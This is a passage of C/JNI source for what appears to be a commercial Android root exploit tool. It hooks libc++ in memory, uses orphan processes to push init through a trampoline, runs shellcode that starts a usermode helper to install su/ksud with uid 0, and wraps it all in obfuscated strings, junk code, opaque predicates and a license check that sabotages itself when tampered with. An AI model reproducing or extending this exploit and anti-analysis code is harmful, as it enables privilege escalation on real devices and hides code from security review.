                        char tb[200];
                        snprintf(tb, sizeof tb, OBF(174), hn);
                        /* reuse GC_PID trace format is wrong; use plain trace */
                        trace(OBF(206));
                    }
                }
            }
        }
    }
    if (patch_hook(OBF(64),
                   hook_sym,
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   reporter, &libcxx_r)) goto done;

    rc = 2;
    usleep(500000);
    REPORTLN(OBF(66));
    createOrphanProcess(reporter);
    trace(OBF(66));

    const struct {
        const char *path;
        const char *msg;
        int         rc;
    } markers[] = {
        { OBF(67),   OBF(68), -1 },
        { OBF(69), OBF(70),                        0 },
        { OBF(71), OBF(72), 1 },
    };
    /* MEY patch: stale markers from a previous run must not short-circuit
       this run's trigger window - snapshot existence before triggering. */
    int pre[sizeof(markers)/sizeof(markers[0])];
    for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++)
        pre[j] = has_marker(markers[j].path);
    int seen[sizeof(markers)/sizeof(markers[0])] = {0};
    /* v14: markers[0] is the shellcode's own mutex file (/dev/xkm). If it
     * pre-exists, the shellcode already RAN on this boot - its O_EXCL open
     * will bounce every further attempt, so retrying without a reboot can
     * never start the UMH (measured on the remote 12+512 device: second
     * run on one boot -> already hooked -> UMH never started). Say so. */
    if (pre[0]) {
        REPORTLN(OBF(171));
        trace(OBF(172));
    }

    /* v15: direct observation of the orphan adoption/reaping chain.
     * gc_state: 0 = pid not yet observed, 1 = alive (ppid seen),
     *           2 = reaped (entry gone - init must have called wait()). */
    int gc_pid = -1;
    int gc_state = 0;
    static char xfrm0[2048];
    int xfrm0_ok = (xfrm_read(xfrm0, sizeof xfrm0) == 0);

    /* MEY: the window must cover the whole UMH payload, not just the module
     * load. tool v8 installs ksud, runs late-load, and a backgrounded su
     * child installs two modules + a second late-load - ~40s wall clock on
     * MEY-AN00 - so 5s here always expired first and the app reported
     * check-logs on a run that had actually succeeded (verified on-device:
     * su returned uid=0/u:r:ksu:s0 while the UI said FAILED). v1.2: a second
     * device (same model, same kernel build) FAILED with NO tool.log at all
     * - UMH child never got far enough to open its log, or storage was slow.
     * Widen 90s -> 180s, and report a one-shot heartbeat the moment tool.log
     * first appears, so the feedback zip can tell UMH-started-unfinished
     * from UMH-never-started. */
    int toollog_seen = 0;
    for (int elapsed = 0; elapsed < 180000; elapsed += 10) {
        usleep(10000);
        /* v8: poll the tool's own verdict line every 500ms. The tool log fd
         * is opened in the permissive window into the app's device-protected
         * files dir, so this path is readable by this process regardless of
         * what enforcing does to the UMH child. */
        if (elapsed % 50 == 0 && elapsed > 0) {
            if (!toollog_seen && has_marker(OBF(152))) {
                toollog_seen = 1;
                REPORTLN(OBF(162));
                trace(OBF(162));
            }
            int st = tool_verdict(OBF(152));
            if (st > 0) {
                REPORTLN(OBF(73), OBF(70));
                trace(OBF(70));
                rc = 0;
                goto done;
            }
            if (st < 0) {
                REPORTLN(OBF(73), OBF(72));
                trace(OBF(72));
                rc = 1;
                goto done;
            }
        }
        /* v15: once per second, watch the orphan chain. The grandchild's
         * ppid must flip to 1 (init adopts it) and its /proc entry must
         * vanish about a second later (init reaps it -> LOG INFO ->
         * ostream sentry -> our trampoline). Each transition is traced so
         * the feedback zip pins down exactly which hop is dead. */
        if (elapsed % 1000 == 0) {
            if (gc_pid < 0) gc_pid = find_gc_pid();
            if (gc_pid > 0) {
                int ppid = read_ppid(gc_pid);
                if (ppid > 0 && gc_state < 1) {
                    gc_state = 1;
                    char tb[96];
                    snprintf(tb, sizeof tb, OBF(180), gc_pid, ppid);
                    trace(tb);
                } else if (ppid <= 0 && gc_state >= 1) {
                    gc_state = 2;
                    char tb[96];
                    snprintf(tb, sizeof tb, OBF(181),
                             gc_pid, elapsed / 1000, elapsed % 1000);
                    trace(tb);
                }
            }
        }
        /* v195: multi-orphan bait - each orphan death is one init-reap
         * event, and each reap runs init's main thread through the hooked
         * sentry. One orphan per 10s = 18 trigger chances per window
         * instead of 1. createOrphanProcess traces each new GC_PID; the
         * probe above follows the latest one. */
        if (elapsed > 0 && elapsed % 10000 == 0) {
            createOrphanProcess(reporter);
        }
        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
            if (!seen[j] && !pre[j] && has_marker(markers[j].path)) {
                seen[j] = 1;
                REPORTLN(OBF(73), markers[j].msg);
                trace(markers[j].msg);
                if (markers[j].rc >= 0) {
                    rc = markers[j].rc;
                    goto done;
                }
            }
        }
    }
    REPORTLN(OBF(63));
    /* v1.2 diagnostics: the timeout reason differs if the UMH tool at least
     * opened its log (started) vs never created the file (not started). */
    REPORTLN(toollog_seen ? OBF(153) : OBF(154));
    trace(toollog_seen ? OBF(153) : OBF(154));
    /* v15: final trigger-chain verdict for this run. */
    if (gc_pid < 0) {
        trace(OBF(182));
    } else if (gc_state == 0) {
        trace(OBF(183));
    } else if (gc_state == 1) {
        trace(OBF(184));
    } else {
        trace(OBF(185));
    }
    if (xfrm0_ok) {
        char xfrm1[2048];
        if (xfrm_read(xfrm1, sizeof xfrm1) == 0) {
            const char *names[] = { OBF(186), OBF(187),
                                    OBF(188), OBF(189),
                                    OBF(190), OBF(191),
                                    OBF(192), OBF(193),
                                    OBF(194), OBF(195),
                                    OBF(196), OBF(197),
                                    OBF(198), OBF(199) };
            char diff[192] = { 0 };
            for (size_t k = 0; k < sizeof(names)/sizeof(names[0]); k++) {
                long v0 = xfrm_val(xfrm0, names[k]);
                long v1 = xfrm_val(xfrm1, names[k]);
                if (v0 >= 0 && v1 >= 0 && v0 != v1) {
                    char one[48];
                    snprintf(one, sizeof one, OBF(200),
                             names[k], v0, v1);
                    strncat(diff, one, sizeof diff - strlen(diff) - 1);
                }
            }
            if (diff[0]) {
                char tb[256];
                snprintf(tb, sizeof tb, OBF(201), diff);
                trace(tb);
            } else {
                trace(OBF(202));
            }
        }
    }
done:
    if (rc == 3) REPORTLN(OBF(74));
    REPORTLN(OBF(75));
    restore_hook(&libcxx_r, reporter);
    fadvise_drop(kCrashDump, reporter);
    free(libcxx_r.shell_orig);
    return rc;
}

/* ---- license entry point (registered as n0) ---- */

static int detect_tamper(void) {
    int bad = 0;
    JUNK();
    FILE *f = fopen(OBF(76), OBF(9));
    if (f) {
        char line[128];
        int seen = 0;
        while (!seen && fgets(line, sizeof line, f)) {
            if (!strncmp(line, OBF(77), 10)) {
                if (MBA_NEQ((uint32_t)atoi(line + 10), 0u)) bad = 1;
                seen = 1;
            }
        }
        fclose(f);
    } else if (OPAQUE_F()) {
        bad = 2;              /* 永不可达：干扰静态控制流分析 */
    } else {
        bad = 1;
    }
    JUNK();
    f = fopen(OBF(78), OBF(9));
    if (f) {
        char line[512];
        while (fgets(line, sizeof line, f)) {
            if (strstr(line, OBF(79)) || strstr(line, OBF(80))) {
                bad = 1;
                if (OPAQUE_F()) bad = 3;
                break;
            }
        }
        fclose(f);
    }
    return MBA_ADD((uint32_t)bad, 0u);
}

static jboolean n0(JNIEnv *env, jclass clz __attribute__((unused)),
                   jobject reporter_obj,
                   jbyteArray lic, jbyteArray fp, jstring blobPath) {
    struct Reporter dro = {.env = env, .obj = reporter_obj}, *reporter = &dro;
    if (!lic || !fp || !blobPath) { REPORTLN(OBF(81)); return JNI_FALSE; }
    jsize ll = (*env)->GetArrayLength(env, lic);
    jsize fl = (*env)->GetArrayLength(env, fp);
    if (ll != LIC_RAW_LEN || fl != 32) {
        REPORTLN(OBF(82), (int)ll, (int)fl);
        return JNI_FALSE;
    }

    jbyte *lp  = (*env)->GetByteArrayElements(env, lic, NULL);
    jbyte *fpp = (*env)->GetByteArrayElements(env, fp, NULL);
    const char *path = (*env)->GetStringUTFChars(env, blobPath, NULL);
    jboolean ok = JNI_FALSE;

    uint8_t *blob = NULL;
    size_t blob_len = 0;
    if (path) {
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            struct stat st;
            if (fstat(fd, &st) == 0 && st.st_size > 0 &&
                st.st_size < 64 * 1024 * 1024) {
                blob = malloc((size_t)st.st_size);
                if (blob) {
                    ssize_t total = 0, n;
                    while (total < st.st_size &&
                           (n = read(fd, blob + total,
                                     (size_t)(st.st_size - total))) > 0)
                        total += n;
                    if (total == st.st_size) blob_len = (size_t)total;
                    else { free(blob); blob = NULL; }
                }
            }
            close(fd);
        }
    }

    if (blob) {
        /* Poisoned runs derive keys from a random extra salt: every check
         * fails, nothing is reported, the exploit just won't land. */
        uint8_t extra[32];
        const uint8_t *extra_p = NULL;
        int tampered = detect_tamper();
        if (tampered) {
            lic_set_poisoned();
            int fd = open(OBF(83), O_RDONLY);
            if (fd >= 0) {
                ssize_t n = read(fd, extra, sizeof extra);
                (void)n;
                close(fd);
            }
            extra_p = extra;
        }
        int rc = lic_unlock((const uint8_t *)lp, (size_t)ll,
                            (const uint8_t *)fpp, extra_p, extra_p ? 32u : 0u,
                            blob, blob_len);
        /* diagnostic build: report failure step + tamper state */
        REPORTLN(OBF(84), rc, tampered, blob_len);
        ok = (rc == 0) ? JNI_TRUE : JNI_FALSE;
        memset(blob, 0, blob_len);
        free(blob);
    }

    if (path) (*env)->ReleaseStringUTFChars(env, blobPath, path);
    if (fpp) (*env)->ReleaseByteArrayElements(env, fp, fpp, JNI_ABORT);
    if (lp)  (*env)->ReleaseByteArrayElements(env, lic, lp, JNI_ABORT);
    return ok;
}
